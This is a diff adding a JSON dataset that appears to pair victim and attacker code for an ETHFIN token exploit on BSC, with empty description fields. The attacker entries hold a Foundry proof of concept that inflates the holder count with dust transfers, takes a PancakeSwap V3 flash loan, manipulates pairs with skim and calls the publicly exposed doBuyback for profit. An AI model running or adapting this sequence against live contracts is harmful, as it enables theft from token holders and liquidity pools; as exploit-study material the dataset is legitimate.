@@ -1,0 +1,135 @@
+[
+  {
+    "contract/interface": "IETHFIN",
+    "source_type": "victim_contract",
+    "function_name": "N_holders",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IETHFIN",
+    "source_type": "victim_contract",
+    "function_name": "NextBuybackMemberCount",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IETHFIN",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IETHFINToken",
+    "source_type": "victim_contract",
+    "function_name": "doBuyback",
+    "original_code": "function doBuyback() public returns (bool) //set to private\n{\n   if((_isLaunched == true)&&(N_holders >= NextBuybackMemberCount)) \n   {\n     uint256 amountBNB = BuybackPotBNB * 40 / 100; //max 40% of pot per transaction\n      \n      uint256 tokens = __balanceOf[MainWallet];\n\n    //burn tokens\n    SingleUntaxedTransfer = true;\n    BuybackPotBNB -= amountBNB;\n    if(_swapBNBforChosenTokenandPayout(amountBNB,address(this),MainWallet)==false) //transaction did not revert\n    BuybackPotBNB += amountBNB; //failed put back into pot\n    else\n    {//success\n    \n    if(__balanceOf[MainWallet]>tokens)  //netto balance of contract increased\n    {\n        tokens = __balanceOf[MainWallet] - tokens; //set to difference and burn if required\n\n     _transfer(MainWallet,Contract,tokens);//transfers tokens back to contract address before burning.\n     if((__totalSupply - tokens > burnUntil))\n        _burn(address(this), tokens);\n    }\n       emit Buyback_(tokens, N_holders); \n    \n     NextBuybackMemberCount = NextBuybackMemberCount + Buyback_increment;\n     Buyback_increment = Buyback_increment * 110/100; //wait 10% longer each time\n     return true;\n    }\n   \n }\n return false;\n\n}\n\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeV3FlashCallback",
+    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        wbnb.approve(router_address, type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = wbnbAddress;\n        path[1] = eftoken;\n        uint256[] memory amounts = router.swapTokensForExactTokens(\n            543_357_312_592_081_354_942_659_827, 12_000_000_000_000_000_000, path, pancakeSwap, block.timestamp + 120\n        );\n        IPancakePair(pancakeSwap).skim(eftoken);\n\n        uint256[] memory amounts2 = router.swapTokensForExactTokens(\n            10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120\n        );\n        path[1] = ethfin;\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            wbnb.balanceOf(address(this)) - 1000, 0, path, pancakeSwap2, block.timestamp + 120\n        );\n        IPancakePair(pancakeSwap2).skim(address(this));\n\n        bool status = IETHFINToken(ethfin).doBuyback();\n        require(status, \"Buyback failed\");\n\n        path[1] = eftoken;\n        uint256[] memory amounts3 = router.swapTokensForExactTokens(\n            10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120\n        );\n        uint256 ethfin_balance = ethfinToken.balanceOf(address(this));\n        IERC20(ethfin).transfer(pancakeSwap2, ethfin_balance);\n        IPancakePair(pancakeSwap2).skim(pancakeSwap3);\n\n        address[] memory path2 = new address[](2);\n        path2[0] = ethfin;\n        path2[1] = wbnbAddress;\n        uint256[] memory amounts_out = router.getAmountsOut(ethfin_balance, path2);\n        IPancakePair(pancakeSwap3).swap(0, amounts_out[1], address(this), \"\");\n\n        wbnb.transfer(pancakeV3Pool, 12_001_200_000_000_000_000);\n        wbnb.withdraw(wbnb.balanceOf(address(this)));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 37_400_485 - 1);\n        deal(address(ethfinToken), address(this), 1500); // initial tokens\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ETHFIN",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        uint256 init = address(this).balance;\n        uint256 holders = IETHFIN(ethfin).N_holders();\n        uint256 next_buy_back_member = IETHFIN(ethfin).NextBuybackMemberCount();\n        uint160 base = 501;\n        // weird loop\n        while (holders <= next_buy_back_member) {\n            IETHFIN(ethfin).transfer(address(base), 1);\n            holders = IETHFIN(ethfin).N_holders();\n            base++;\n        }\n        IPancakePool(pancakeV3Pool).flash(\n            address(this),\n            0,\n            12_000_000_000_000_000_000,\n            abi.encode(0x000000000000000000000000172fcd41e0913e95784454622d1c3724f546f849)\n        );\n        uint256 after_attack = address(this).balance;\n        emit log_named_decimal_uint(\"Attacker BNB end exploited\", after_attack - init, 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPancakePool",
+    "source_type": "victim_contract",
+    "function_name": "flash",
+    "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external override lock {\n        uint128 _liquidity = liquidity;\n        require(_liquidity > 0, 'L');\n\n        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);\n        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);\n        uint256 balance0Before = balance0();\n        uint256 balance1Before = balance1();\n\n        if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);\n        if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);\n\n        IPancakeV3FlashCallback(msg.sender).pancakeV3FlashCallback(fee0, fee1, data);\n\n        uint256 balance0After = balance0();\n        uint256 balance1After = balance1();\n\n        require(balance0Before.add(fee0) <= balance0After, 'F0');\n        require(balance1Before.add(fee1) <= balance1After, 'F1');\n\n        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n        uint256 paid0 = balance0After - balance0Before;\n        uint256 paid1 = balance1After - balance1Before;\n\n        if (paid0 > 0) {\n            uint32 feeProtocol0 = slot0.feeProtocol % PROTOCOL_FEE_SP;\n            uint256 fees0 = feeProtocol0 == 0 ? 0 : (paid0 * feeProtocol0) / PROTOCOL_FEE_DENOMINATOR;\n            if (uint128(fees0) > 0) protocolFees.token0 += uint128(fees0);\n            feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);\n        }\n        if (paid1 > 0) {\n            uint32 feeProtocol1 = slot0.feeProtocol >> 16;\n            uint256 fees1 = feeProtocol1 == 0 ? 0 : (paid1 * feeProtocol1) / PROTOCOL_FEE_DENOMINATOR;\n            if (uint128(fees1) > 0) protocolFees.token1 += uint128(fees1);\n            feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);\n        }\n\n        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n    }\n\n    /// @inheritdoc IPancakeV3PoolOwnerActions\n",
+    "description": ""
+  }
+]
